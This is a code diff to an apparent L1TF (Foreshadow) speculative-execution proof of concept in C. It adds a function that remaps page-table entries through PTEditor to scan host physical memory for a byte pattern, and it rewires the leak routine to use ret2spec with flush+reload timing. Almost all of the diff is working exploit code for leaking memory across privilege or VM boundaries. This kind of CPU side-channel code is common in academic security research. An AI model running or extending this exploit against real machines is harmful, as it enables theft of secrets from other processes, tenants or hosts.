@@ -27,7 +27,7 @@
 static void segfault_handler_nibbles(int sig, siginfo_t *info, void *ucontext) {
   ucontext_t *uc = (ucontext_t *)ucontext;
   greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
-  *rip = (uint64_t)&reload_label_nibbles;
+  // *rip = (uint64_t)&reload_label_nibbles;
 }
 
 static void segfault_handler_full(int sig, siginfo_t *info, void *ucontext) {
@@ -58,7 +58,8 @@ uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   clflush((void *)segfault_handler_nibbles);
   mfence();
 
-  asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
+  ret2spec(leak_addr, reload_buffer[0], reload_buffer[1]);
+  // asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
 
   reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
          THRESHOLD);
@@ -82,19 +83,34 @@ bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
   return time < THRESHOLD;
 }
 
-// uintptr_t l1tf_scan_physical_memory(size_t length, uint8_t needle[length]) {}
-//
-// void leak_page(size_t pfn, void *leak, reload_buffer_t reload_buffer,
-//                size_t amount_to_leak, uint8_t data_out[amount_to_leak]) {
-//   // Set the PFN of the leak page
-//   ptedit_pte_set_pfn(leak, 0, pfn);
-//
-//   for (size_t j = 0; j < amount_to_leak; j += 1) {
-//     void *leak_addr = (char *)leak + j;
-//     uint8_t leaked_byte = l1tf_full(leak_addr, reload_buffer);
-//     data_out[j] = leaked_byte;
-//   }
-// }
+// Returns a pointer to the physical address where the needle was found.
+void *l1tf_scan_physical_memory(size_t length, char needle[length],
+                                size_t stride) {
+  assert(length > 0);
+
+  leak_addr_t leak = l1tf_leak_buffer_create();
+
+  struct sigaction sa = {0};
+  sa.sa_handler = (void *)segfault_handler_full;
+  sigaction(SIGSEGV, &sa, NULL);
+
+  // First, scan quickly
+  full_reload_buffer_t reload_buffer;
+  for (uintptr_t ptr = 0; ptr < HOST_MEMORY_SIZE; ptr += stride) {
+    printf("%ld\r", ptr / stride);
+    l1tf_leak_buffer_modify(&leak, (void *)ptr);
+    if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
+      printf("%lx\n", ptr);
+    }
+  }
+
+  // Restore the segfault handler back to normal
+  sa.sa_handler = SIG_DFL;
+  sigaction(SIGSEGV, &sa, NULL);
+
+  l1tf_leak_buffer_free(&leak);
+  return 0;
+}
 
 leak_addr_t l1tf_leak_buffer_create() {
   void *leak_ptr = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
@@ -111,8 +127,8 @@ leak_addr_t l1tf_leak_buffer_create() {
   return leak;
 }
 
-void l1tf_leak_buffer_modify(leak_addr_t *leak, uintptr_t ptr) {
-  size_t pfn = (ptr & ~(0xfff)) >> 0xc;
+void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
+  size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;
 
   // This leak addr is already point to the corrent page frame
   // number, so there is no need to modify the page table.
@@ -130,6 +146,9 @@ void l1tf_leak_buffer_free(leak_addr_t *leak) {
 }
 
 int main(int argc, char *argv[argc]) {
+  assert(!ptedit_init());
+  // l1tf_scan_physical_memory(1, "\xde", PAGE_SIZE);
+
   // Step 1: Create a variable
   // Step 2: modify PTE to change make page containing that variable non-present
   //         and modify the PFN
@@ -161,9 +180,8 @@ int main(int argc, char *argv[argc]) {
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(reload_buffer != MAP_FAILED);
 
-  assert(!ptedit_init());
   leak_addr_t leak = l1tf_leak_buffer_create();
-  l1tf_leak_buffer_modify(&leak, phys_addr);
+  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
 
   struct sigaction sa = {0};
   sa.sa_handler = (void *)segfault_handler_nibbles;
